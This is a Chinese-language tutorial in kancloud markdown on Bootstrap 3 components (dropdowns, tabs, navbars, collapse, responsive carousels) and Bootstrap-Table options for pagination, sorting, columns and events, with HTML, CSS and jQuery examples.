        //当鼠标移入的时候，打开下拉
        $('.dropdown-toggle').hover(function(){
            clearTimeout(timer);
            $('.dropdown').addClass('open');
        },function(){
            //移除的时候加上延迟保证可以选上菜单
            timer = setTimeout(function(){
                $('.dropdown').removeClass('open');
            },100);
        });
        $('.dropdown-menu').hover(function(){
            clearTimeout(timer);
        },function(){
            timer = setTimeout(function(){
                $('.dropdown').removeClass('open');
            },100);
        });
    }

```
>[danger] ##### data-target=".dropdown" 同步下拉


在指定按钮加上这个属性，同步其他下拉

![](https://box.kancloud.cn/649ab6bf3354f41e2727b064b377cf7c_943x125.png)

[TOC=1,5]
>[success]  # 标签页

![](https://box.kancloud.cn/b3842a61bb4bd960e89f26192db6403c_1167x246.png)

>[danger] ##### 常用属性

```
头部
	-nav         --菜单样式
    -nav-tabs    --标签页样式
    -nav-justified   --端点对其，让标签按钮等宽
    -nav-tabs-justified  --线自适应
    -nav-pills      --药丸的展示
    -nav-stacked   -- 竖着展示
    -带下拉的头部
```
>[danger] ##### 简单使用

![](https://box.kancloud.cn/8f4d3938f1f5b1a0b4da504f65a34d98_412x77.png)

![](https://box.kancloud.cn/ce2c0855400bcc5decc1529cfad8d625_1022x356.png)
```
<div>
    <!-- 页签 -->
    <!-- Nav tabs -->
    <ul class="nav nav-tabs">
        <li class="active"><a href="#home" data-toggle="tab">Home</a></li>
        <li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">Profile</a></li>
        <li role="presentation"><a href="#messages" aria-controls="messages" role="tab" data-toggle="tab">Messages</a></li>
        <li role="presentation"><a href="#settings" aria-controls="settings" role="tab" data-toggle="tab">Settings</a></li>
    </ul>
    <!--内容-->
    <!-- Tab panes -->
    <div class="tab-content">
        <div class="tab-pane active" id="home">1</div>
        <div role="tabpanel" class="tab-pane" id="profile">2</div>
        <div role="tabpanel" class="tab-pane" id="messages">3</div>
        <div role="tabpanel" class="tab-pane" id="settings">4</div>
    </div>

</div>
```
>[danger] ##### 标签页样式 nav和nav-tabs配合
![](https://box.kancloud.cn/5fae0d1948f4874060b2054b79c441b7_610x184.png)
```
<div class="container" style="margin-top: 20px">
    <ul class="nav nav-tabs">
        <li class="active"><a>one</a></li>
        <li><a>two</a></li>
        <li><a>three</a></li>

    </ul>

</div>	
```

* * * * *
<br>

>[danger] ##### nav-justified和nav-tabs-justified	区别

![](https://box.kancloud.cn/629891f7afca4cbf21b36724b7628d65_1190x287.png)

```
    <div class="container" style="margin-top: 20px">
        <ul class="nav nav-tabs nav-justified">
            <li class="active"><a>one</a></li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>

    </div>


    <div class="container" style="margin-top: 20px">
        <ul class="nav nav-tabs nav-tabs-justified">
            <li class="active"><a>one</a></li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>

    </div>
```


* * * * *
>[danger] ##### 药丸展示-nav-pills 

![](https://box.kancloud.cn/87d967dede4f61ebd69807b88ceacfe1_321x107.png)
```
  <div class="container" style="margin-top: 20px">
        <ul class="nav nav-pills">
            <li class="active"><a>one</a></li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>

    </div>
```

>[danger] ##### 竖状排列-nav-stacked

要和nav-pills 配合

![](https://box.kancloud.cn/fa0d593d4db3ef3128f4d96d1a1b34a6_323x88.png)
```
<div class="container" style="margin-top: 20px">
        <ul class="nav nav-pills nav-stacked">
            <li class="active"><a>one</a></li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>

    </div>
```

>[danger] #####  标签页加下拉

![](https://box.kancloud.cn/66d5f09ee3dfdc09d4adedff013a530f_386x150.png)


![](https://box.kancloud.cn/2a1f37cf3373c064713a5937b574d7fa_691x326.png)

```

    <div class="container" style="margin-top: 20px">
        <ul class="nav nav-tabs">
            <li class="dropdown active">
                <a class="dropdown-toggle" data-toggle="dropdown">
                    one
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a>1</a></li>
                </ul>
            </li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>

    </div>
```
[TOC=1,5]
>[success] # 标签页内容

```
内容
	- tab-content  - 显示内容
	- tab-pane      - 显示标签内容
	- data-toggle="tab"  - 按钮切换点击
	- href 对应id
	- 淡入淡出
	- 鼠标移入方式
	- 带下拉菜单切换
```

>[danger] ##### 显示内容-tab-content/tab-pane  

要加上active 才能显示内容
![](https://box.kancloud.cn/722bf9cb4ae3dfc2a18d21a0039a03c5_854x198.png)

![](https://box.kancloud.cn/63d227247957b88f6f372396d5e5d32d_693x438.png)

```
 <div class="container" style="margin-top: 20px">
        <ul class="nav nav-tabs">
            <li class="dropdown active">
                <a class="dropdown-toggle" data-toggle="dropdown">
                    one
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a>1</a></li>
                </ul>
            </li>
            <li><a>two</a></li>
            <li><a>three</a></li>

        </ul>
        <ul class="tab-content">
            <li class="tab-pane active">aaaa</li>
            <li class="tab-pane ">bbb</li>
            <li class="tab-pane ">cccc</li>
        </ul>

    </div>
```


* * * * *

>[danger] ##### 点击按钮data-toggle="tab"/锚点切换内容


![](https://box.kancloud.cn/037143e0df52a1656eb8c563481c0987_736x271.png)
```
    <div class="container" style="margin-top: 20px">
        <ul class="nav nav-tabs">
            <li class="dropdown active">
                <a class="dropdown-toggle" data-toggle="dropdown">
                    one
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a>1</a></li>
                </ul>
            </li>
            <li><a href="#" data-toggle="tab">two</a></li>
            <li><a href="#" data-toggle="tab">three</a></li>

        </ul>
        <ul class="tab-content">
            <li class="tab-pane active">aaaa</li>
            <li class="tab-pane ">bbb</li>
            <li class="tab-pane ">cccc</li>
        </ul>

    </div>

```

>[danger] ##### 显示美化css

```
.tab-content{
    border: 1px #ddd solid;
    border-top: none;
    border-radius: 0 0 5px 5px;
}
```

![](https://box.kancloud.cn/1b7f100b4fd20d6c691a7bb10a326f68_1213x156.png)



* * * * *

>[danger]  ##### 淡入淡出- fade

![](https://box.kancloud.cn/c128bd099f66b481fa96c1ab830448de_708x151.png)

>[danger] ##### 鼠标移入切换js
![](https://box.kancloud.cn/8d0d9e31e34aa11c0649270535126e92_694x284.png)
```
 $('#myshow a').mouseover(
        function () {
            $(this).tab('show');
        }
    )
```

>[danger] 下拉菜单跳转

只需要在对应的下拉菜单加入 data-toggle=‘tab’
![](https://box.kancloud.cn/43afdaf4f090440a247d92bb0b1bf068_669x271.png)
>[success] # 导航样式
![](https://box.kancloud.cn/5a5b64a0ba70cce66cab5b4521208264_1365x80.png)



>[danger] ##### 常用样式

```
navbar                 --- 导航父类
    navbar-static-top  --- 去掉导航圆角
    navbar-default     --- 导航样式
    navbar-inverse     --- 黑色样式
    navbar-fixed-top   --- 固定定位保持在可视区
nav navbar-nav         --- 导航内容中的样式


```

>[danger]  ##### 代码

![](https://box.kancloud.cn/1f3971e6ba3bcbccc2a0de1bd1d41b51_603x234.png)

```
 <nav class="navbar navbar-default">
            <div class="container">
                <ul class="nav navbar-nav">
                    <li class="active"><a>222</a></li>
                    <li class=""><a>333</a></li>
                    <li class=""><a>444</a></li>
                </ul>

            </div>
        </nav>
```

* * * * *

>[danger] 导航直角样式-navbar-static-top  


![](https://box.kancloud.cn/d1b57d72d5b603cef56b734c4adbf67b_570x211.png)

![](https://box.kancloud.cn/8d26c259357c2852eb1c3a49a2c97726_1403x98.png)


>[danger] ##### 解决导航遮挡问题

```
body{
	margin：50px
}
```
>[success] # 常用导航条样式

>[danger] ##### 常用导航属性

```
制作logo：
	- navbar-header
	- navbar-brand
左右浮动：
	- navbar-left
	- navbar-right
菜单中一些样式
	- navbar-btn
	- navbar-link
	- navbar-text
	- navbar-form
```

>[danger] ##### 整体解析

![](https://box.kancloud.cn/1a7fa6e71f9c23620f9914aa26e9a18d_1301x105.png)
![](https://box.kancloud.cn/cd4dcb8c66223acce0d03a2a94656256_999x488.png)

```
        <nav class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <a href="#" class="navbar-brand">logo</a>
                </div>
                <ul class="nav navbar-nav">
                    <li class="active"><a>222</a></li>
                    <li class=""><a>333</a></li>
                    <li class=""><a>444</a></li>
                </ul>
                <a class="navbar-link"> A标签样式</a>
                <button class="btn btn-danger navbar-btn"> butto标签样式</button>
                <span class="navbar-text"> text标签样式</span>

                <form class="navbar-form navbar-right">
                    <input type="text" class="form-control">
                </form>
                <ul class="nav navbar-nav navbar-right">
                    <li class="active"><a>222</a></li>
                    <li class=""><a>333</a></li>
                    <li class=""><a>444</a></li>
                </ul>
            </div>
        </nav>

```
>[success] # 导航条

![](https://box.kancloud.cn/2362652e35b3ed4bfbe32c8d5116ece9_449x64.png)


* * * * *

```
响应式导航条
	-navbar-toggle    ---- 隐藏按钮
    -collapse navbar-collapse
```

>[danger] ##### 代码

![](https://box.kancloud.cn/48c29e816c6d567d9f99ca202ab7107d_944x445.png)

```
1. 因为隐藏后要显示 logo 和隐藏展示按钮 所以将他们都放到navbar-header ，在缩放的情况下也展示
2. 利用collapse js 插件进行按钮点击展示效果
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>title</title>
    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
</head>
<body>
<!-- navbar 导航模块  navbar-default 默认样式  -->
<nav class="navbar navbar-default">
    <!-- 导航的内容容器，也可以更换成流式布局 -->
    <div class="container">
        <!-- 包含 商标区域 和 切换按钮（在移动端显示） -->
        <div class="navbar-header">
            <!--切换按钮-->
            <!--
            类名：collapsed  样式
            属性：
            data-toggle="collapse"  申明是什么组件=折叠组件
            data-target="#bs-example-navbar-collapse-1" 控制的目标元素=选择器
            其他：
            aria-expanded="false"  aria-* 代表提供给屏幕阅读器使用的（盲人阅读器）
            class="sr-only" screen read only  代表提供给屏幕阅读器使用的（盲人阅读器）
            -->
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <!--商标区域-->
            <a class="navbar-brand" href="#">Brand</a>
        </div>
        <!-- 导航连接  表单  其他内容  被切换 -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <!--默认的导航-->
            <ul class="nav navbar-nav">
                <li class="active"><a href="#">Link</a></li>
                <li><a href="#">Link</a></li>
                <li><a href="#">Link</a></li>
                <li><a href="#">Link</a></li>
                <li><a href="#">Link</a></li>
                <li><a href="#">Link</a></li>
            </ul>
            <!--右对齐的导航-->
            <ul class="nav navbar-nav navbar-right">
                <li><a href="#">Link</a></li>
            </ul>
        </div>
    </div>
</nav>
<script src="../lib/jquery/jquery.min.js"></script>
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
```
>[danger] ##### 缩放组件使用collapse
```
1.data-toggle 生命使用的组件
2.data-target 绑定对应的内容，a标签可以直接用href 绑定，绑定时用css 格式绑定例如class 是. id是#
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>title</title>

    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
   
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
</head>
<body>
<button data-toggle="collapse" data-target=".box">切换</button>
<a href=".box" data-toggle="collapse" >切换</a>
<div class="box">
    内容<br>
    内容<br>
    内容<br>
    内容<br>
    内容<br>
</div>
<script src="../lib/jquery/jquery.min.js"></script>
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>

```
[TOC]
>[success] # 轮播图
```
<!-- carousel 轮播图的模块  slide是否加上滑动效果 -->
<!-- data-ride="carousel" 初始化轮播图属性-->
<div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
    <!-- 点盒子 -->
    <ol class="carousel-indicators">
        <!--
            data-target="#carousel-example-generic" 控制目标轮播图
            data-slide-to="0" 控制的是轮播图当中的第几张 （索引）
            class="active" 当前选中的点
        -->
        <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
        <li data-target="#carousel-example-generic" data-slide-to="1"></li>
        <li data-target="#carousel-example-generic" data-slide-to="2"></li>
    </ol>
    <!-- 图片盒子 -->
    <!-- role="listbox" 提供给屏幕阅读器使用 -->
    <div class="carousel-inner">
        <!--需要轮播的容器-->
        <div class="item active">
            <!--图片-->
            <img src="..." alt="...">
            <!--说明,图片下侧的说明-->
            <div class="carousel-caption">
                ...
            </div>
        </div>
        <div class="item">
            <img src="..." alt="...">
            <div class="carousel-caption">
                ...
            </div>
        </div>
        ...
    </div>

    <!-- 上一张下一张按钮 -->
    <!--
     data-slide="prev"
     data-slide="next"
     href="#carousel-example-generic"   控制目标轮播图
    -->
    <a class="left carousel-control" href="#carousel-example-generic"  data-slide="prev">
        <span class="glyphicon glyphicon-chevron-left"></span>
    </a>
    <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
        <span class="glyphicon glyphicon-chevron-right"></span>
    </a>
</div>
```
>[danger] ##### pc 端适配
```
1.设置一个a标签当图片作为背景色，用css3中的背景样式去设置这些内容，让图片自适应居中
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>title</title>
    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
    <style>
        .pc_imgBox{
            display: block;
            height: 400px;
            width: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
    </style>
</head>
<body>
<!--
需求：高度固定，图片居中，容器铺满
怎么设置不同图片：使用css选择器来设置不太好（html内容动态改变不利于维护）
-->
<div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
    <ol class="carousel-indicators">
        <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
        <li data-target="#carousel-example-generic" data-slide-to="1"></li>
        <li data-target="#carousel-example-generic" data-slide-to="2"></li>
        <li data-target="#carousel-example-generic" data-slide-to="3"></li>
    </ol>
    <div class="carousel-inner">
        <div class="item active">
            <a href="#" class="pc_imgBox" style="background-image: url(../images/slide_01_2000x410.jpg)"></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox" style="background-image: url(../images/slide_02_2000x410.jpg)"></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox" style="background-image: url(../images/slide_03_2000x410.jpg)"></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox" style="background-image: url(../images/slide_04_2000x410.jpg)"></a>
        </div>
    </div>
    <a class="left carousel-control" href="#carousel-example-generic"  data-slide="prev">
        <span class="glyphicon glyphicon-chevron-left"></span>
    </a>
    <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
        <span class="glyphicon glyphicon-chevron-right"></span>
    </a>
</div>
<!-- bootstrap依赖jquery-->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="../lib/jquery/jquery.min.js"></script>
<!-- bootstrap js 核心文件-->
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
```
>[danger] ##### 手机端
```
1.手机端 img 变成block 元素进行整理
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>title</title>
    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
    <style>
        .m_imgBox{
            display: block;
            width: 100%;
        }
        .m_imgBox img{
            display: block;
            width: 100%;
        }
    </style>
</head>
<body>
<!--
需求：宽度自适应，高度自动变化
-->
<div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
    <ol class="carousel-indicators">
        <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
        <li data-target="#carousel-example-generic" data-slide-to="1"></li>
        <li data-target="#carousel-example-generic" data-slide-to="2"></li>
        <li data-target="#carousel-example-generic" data-slide-to="3"></li>
    </ol>
    <div class="carousel-inner">
        <div class="item active">
            <a href="#" class="m_imgBox"><img src="../images/slide_01_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="m_imgBox"><img src="../images/slide_02_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="m_imgBox"><img src="../images/slide_03_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="m_imgBox"><img src="../images/slide_04_640x340.jpg" alt=""></a>
        </div>
    </div>
    <a class="left carousel-control" href="#carousel-example-generic"  data-slide="prev">
        <span class="glyphicon glyphicon-chevron-left"></span>
    </a>
    <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
        <span class="glyphicon glyphicon-chevron-right"></span>
    </a>
</div>
<!-- bootstrap依赖jquery-->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="../lib/jquery/jquery.min.js"></script>
<!-- bootstrap js 核心文件-->
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
```
>[danger] ##### 自动判断手机还是pc
```
1.手机pc放到一起，利用bootstrap的hidden 判断当前谁显示
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>title</title>
    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
    <style>
        .pc_imgBox{
            display: block;
            height: 400px;
            width: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .m_imgBox{
            display: block;
            width: 100%;
        }
        .m_imgBox img{
            display: block;
            width: 100%;
        }
    </style>
</head>
<body>
<div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
    <ol class="carousel-indicators">
        <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
        <li data-target="#carousel-example-generic" data-slide-to="1"></li>
        <li data-target="#carousel-example-generic" data-slide-to="2"></li>
        <li data-target="#carousel-example-generic" data-slide-to="3"></li>
    </ol>
    <div class="carousel-inner">
        <div class="item active">
            <a href="#" class="pc_imgBox hidden-xs" style="background-image: url(../images/slide_01_2000x410.jpg)"></a>
            <a href="#" class="m_imgBox hidden-lg hidden-md hidden-sm"><img src="../images/slide_01_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox hidden-xs" style="background-image: url(../images/slide_02_2000x410.jpg)"></a>
            <a href="#" class="m_imgBox hidden-lg hidden-md hidden-sm"><img src="../images/slide_02_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox hidden-xs" style="background-image: url(../images/slide_03_2000x410.jpg)"></a>
            <a href="#" class="m_imgBox hidden-lg hidden-md hidden-sm"><img src="../images/slide_03_640x340.jpg" alt=""></a>
        </div>
        <div class="item">
            <a href="#" class="pc_imgBox hidden-xs" style="background-image: url(../images/slide_04_2000x410.jpg)"></a>
            <a href="#" class="m_imgBox hidden-lg hidden-md hidden-sm"><img src="../images/slide_04_640x340.jpg" alt=""></a>
        </div>
    </div>
    <a class="left carousel-control" href="#carousel-example-generic"  data-slide="prev">
        <span class="glyphicon glyphicon-chevron-left"></span>
    </a>
    <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
        <span class="glyphicon glyphicon-chevron-right"></span>
    </a>
</div>

<!-- bootstrap依赖jquery-->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="../lib/jquery/jquery.min.js"></script>
<!-- bootstrap js 核心文件-->
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
```
>[success] # Bootstrap 插件

>Bootstrap-Table显示数据到表格的方式有两种，一种是客户端（client）模式，一种是服务器（server）模式。
　　所谓客户端模式，指的是在服务器中把要显示到表格的数据一次性加载出来，然后转换成JSON格式传到要显示的界面中，客户端模式较为简单，它是把数据一次性加载出来放到界面上，然后根据你设置的每页记录数，自动生成分页。当点击第二页时，会自动加载出数据，不会再向服务器发送请求。同时用户可以使用其自带的搜索功能，可以实现全数据搜索。对于数据量较少的时候，可以使用这个方法。
　　所谓服务器模式，指的是根据设定的每页记录数和当前要显示的页码，发送数据到服务器进行查询，然后再显示到表格中。该方法可以根据用户的需要动态的加载数据，节省了服务器的资源，但是不能使用其自带的全数据搜索功能。

>[info]总结：
>客户端模式-一次全加载
>服务器模式-请求多少加载多少，但不能用自带的全局搜索功能

>[danger] ## 使用

>[info] ##### 引入对应的css/js文件
```
<link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/static/bootstrap/css/bootstrap-table.css">

<!--js文件-->
<script src="jquery.min.js"></script>
<script src="bootstrap.min.js"></script>
<script src="bootstrap-table.js"></script>
<-- 语言脚本-->
<script src="bootstrap-table-zh-CN.js"></script>
```

>[info] ##### data 属性的方式使用

无需编写 JavaScript 启用 bootstrap table，我们对普通的 table 设置 data-toggle="table" 即可。
`data-toggle` 相当于bootstrap 中引入对应展示

```
<table data-toggle="table">
    <thead>
        <tr>
            <th>Item ID</th>
            <th>Item Name</th>
            <th>Item Price</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>1</td>
            <td>Item 1</td>
            <td>$1</td>
        </tr>
        <tr>
            <td>2</td>
            <td>Item 2</td>
            <td>$2</td>
        </tr>
    </tbody>
</table>
```
我们也可以通过设置远程的 url 如 data-url="data1.json" 来加载数据。
```
<table data-toggle="table" data-url="data1.json">
    <thead>
        <tr>
            <th data-field="id">Item ID</th>
            <th data-field="name">Item Name</th>
            <th data-field="price">Item Price</th>
        </tr>
    </thead>
</table>
```
>[info] ##### JavaScript 方式使用

![](https://box.kancloud.cn/a20280ffd98c87eaf24c7b65db158941_523x167.png)

通过和表格的id 或者class 属性绑定js生成表格
```
 <table id="table"></table>
```
**注明**： `ur`l对应的json链接，`colums`-是一个列表，里面字典两个k，`field`指的是json返回的k，`title`指的是显示标题
```
$('#table').bootstrapTable({
    url: '/pertable.html',
    columns: [{
        field: 'id',
        title: '编号'
    }, {
        field: 'name',
        title: '名字'
    }, {
        field: 'age',
        title: '年龄'
    }, ]
});
```
来看一下json 返回的格式，数据要用data为k，里面的返回的字典数据中的k就是上面定义的`field`
```
{'status': True, 
'data': [
		{'name': 'wang', 'id': 1, 'age': 12},
		{'name': 'chun', 'id': 2, 'age': 13}
        ]}
```
[TOC=1,5]
>[success] #  配置

这里我将配置分成了三块，第一部分基本配置，第二部分字段配置，第三部分点击事件

![](https://box.kancloud.cn/26a95d62e7f5704155ac5fae242b08a9_851x516.png)

>[success] # 第一部分

>[danger] ### 加载的连接—url
```
url:queryUrl  -----queryUrl填写你自己配置的
```

>[danger] ### 请求方式—method

```
method:'GET'
```

>[danger] ### 添加自定义工具—toolbar

```
toolbar: '#toolbar',   ----#toolbar是必要绑定的块id
```

![](https://box.kancloud.cn/4c2b7746726b016fcc6c7133be57b367_791x298.png)

**效果**
![](https://box.kancloud.cn/41452602931a4e274114debaf5c95627_555x316.png)



>[danger] ### 无边框table样式—classes
```
classes:'table-no-bordered', 
```

* * * * *

>[danger] ### 显示行间隔色—striped
```
striped:true, //是否显示行间隔色
```

* * * * *

>[danger] ### 是否使用缓存—cache:flase
```
cache: false, //是否使用缓存，默认为true，所以一般情况下需要设置一下这个
```

* * * * *
>[danger] ### 分页一组属性
```
sidePagination:'server',//分页方式：client客户端分页，server服务端分页（*） pageNumber:1,    //初始化加载第一页，默认第一页,并记录
pageSize: 2 ,         //如果设置了分页，页面数据条数。
pageList :[10, 25, 50, 100],//如果设置了分页，设置可供选择的页面数据条数。设置为 All 或者 Unlimited，则显示所有记录。
```

>[danger] ##### 分页方式—sidePagination
```
有两种分页，
1.client，就是客户端分页，获取json的格式跟文档的传统格式一致
2.是server 就是每次分页请求都会访问服务端，这里对json的要求就给如下,rows为k里面装着请回来的数据，total是总
		{'rows': [
        			{'id': 1, 'name': 'wang', 'age': 12}, 
        			{'id': 2, 'name': 'chun', 'age': 13},
                    												], 
        				'total': 3}
```

* * * * *
>[danger] ##### 初始化加载第一页—pageNumber
```
pageNumber:1,    //初始化加载第一页，默认第一页,并记录
```

* * * * *
>[danger] ##### 页面数据条数—pageSize
```
pageSize: 2 ,         //如果设置了分页，页面数据条数。
```

* * * * *
>[danger] ##### 页面数据条数—pageList
```
pageList :[10, 25, 50, 100],//如果设置了分页，设置可供选择的页面数据条数。设置为 All 或者 Unlimited，则显示所有记录。
```

* * * * *
>[danger] ##### 设置成服务器的分页，配置事件

连接效果
![](https://box.kancloud.cn/8d10d2230689d1758ee28a44f1b8d9ff_632x22.png)
```
queryParams : function (params) {
                    //这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的
                    var temp = {
                        rows: params.limit,                         //页面条数
                        page: (params.offset / params.limit) + 1,   //页码
                        sort: params.sort,      //排序列名
                        sortOrder: params.order, //排位命令（desc，asc）

                        search:params.search//后台查询
                    };
                    return temp;
                },
         
 ```

* * * * *
>[danger] ### 排序一组配置
```
sortable: true, //是否可以排序
sortOrder:"desc", // 升序还是降序
sortName:'name',// 根据那个字段
 //sorter:function 自定义一个排序的方法
```

* * * * *
>[danger] ##### 是否可以排序-sortable
```
sortable: true, //是否可以排序
```

* * * * *

>[danger] ##### 升序还是降序-sortOrder
```
sortOrder:"desc", // 升序还是降序
```

* * * * *

>[danger] ##### 根据字段-sortName
```
sortName:'name',// 根据那个字段
```

* * * * *
>[danger] ##### 自定义排序方法-sorter
```
 //sorter:function 自定义一个排序的方法

```


* * * * *
>[danger] ### 显示展示列
![](https://box.kancloud.cn/d071c26267ae62339c51c38b7208bb7d_586x290.png)

>[danger] ##### 可以选择显示列按钮-showColumns
```
showColumns:true,// 可以选择显示列按钮
```

* * * * *

>[danger] ##### 显示最少显示的列数-minimumCountColumns
```
 minimumCountColumns:2,//和上面的配合显示最少显示的列数
```

* * * * *

>[danger] ### 每一行详细信息显示


![](https://box.kancloud.cn/aa4eb87343d4f9e027408544e486ea6c_567x341.png)


>[danger] ##### 每行详情按钮-detailView
```
 detailView:true, //出现实现每行详情按钮
```

* * * * *

>[danger] ##### 展示显示内容-detailFormatter

```
detailFormatter:detaRowForma, //和上面配合使用通过自定义函数，展示显示内容
```
**例如：**
```
function detaRowForma(index,row) {
            return 111
        }
```

* * * * *


>[danger] ### 显示搜索框-search

```
 search: true,//显示搜索框
```

>[danger] ### 搜索方式-strictSearch

```
strictSearch: true,//设置为 true启用全匹配搜索，否则为模糊搜索
```

* * * * *
>[danger] ### 刷新-showRefresh

```
showRefresh: true,                  //是否显示刷新按钮
```

* * * * *

>[danger] ### 设置表格的高度-height
```
 //height: 500,                      //行高，如果没有设置height属性，表格自动根据记录条数觉得表格高度
```

>[danger] ### 设置详细视图
![](https://box.kancloud.cn/e293d19acb44116ef3c5a21db0e12469_639x375.png)

```

showToggle: true,                   //是否显示详细视图和列表视图的切换按钮
```


>[success] # 第二部分

>[danger] ##### 复选框-checkbox
![](https://box.kancloud.cn/4ccfab6603f60f94ed69b660e9003ab1_182x126.png)
```
 columns: [
                {
                    checkbox: true,
                    //visible: false   默认true false 不显示checkbox
                }
                ]
```

>[danger] ##### 字段和标题 居中方式

方式分左右中

```
{
                field: 'id',
                title: '编号',
                editable:true
                //align :'center', 标题和文字都居中
            }
```

>[danger] ##### 自定义 表格数据

```
 {
                field: 'name',
                title: '名字',
                //halign:'center' 只是标题居中
                formatter:nameFormatter,// 自定义数据显示内容，是一个function，里面有三个参数value当前的后台返回数据，row是每行的对象，index是序列
            },
```
**自定义方法**
```
 function nameFormatter (value, row, index) {
            console.log(index)
            return "<a href='mailto:" + value + "' title='单击打开连接'>" + value + "</a>";
        };
```

* * * * *
>[danger] ##### 列的隐藏和显示

```
{
                field: 'age',
                title: '年龄',
                //valign :'left'
                //visible: false true显示该列，false 隐藏不显示
                //switchable:false   showColumns 加的时候不在这显示这个列
            }
```


>[success] # 第三部分

>[danger] ### 请求服务器数据时-queryParams 分页
```
queryParams : function (params) {
                    //这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的
                    var temp = {
                        rows: params.limit,                         //页面条数
                        page: (params.offset / params.limit) + 1,   //页码
                        sort: params.sort,      //排序列名
                        sortOrder: params.order, //排位命令（desc，asc）

                        search:params.search//后台查询
                    };
                    return temp;
                },
```

>[danger] ### 加载成功触-onLoadSuccess
```
 onLoadSuccess: function () {
                },
```

* * * * *
>[danger] ### 加载失败触-onLoadError
```
onLoadError: function () {
                    showTips("数据加载失败！");
                },
```

* * * * *

>[danger] ### 双击某一行

```
/*
            *   row：点击行的数据，
                $element：tr 元素，
                field：点击列的 field 名称。
            * */
                onDblClickRow: function (row, $element) {
                    var id = row.ID;

                },
                
```


>[danger] ### 设置表格样式-rowStyle
>
```
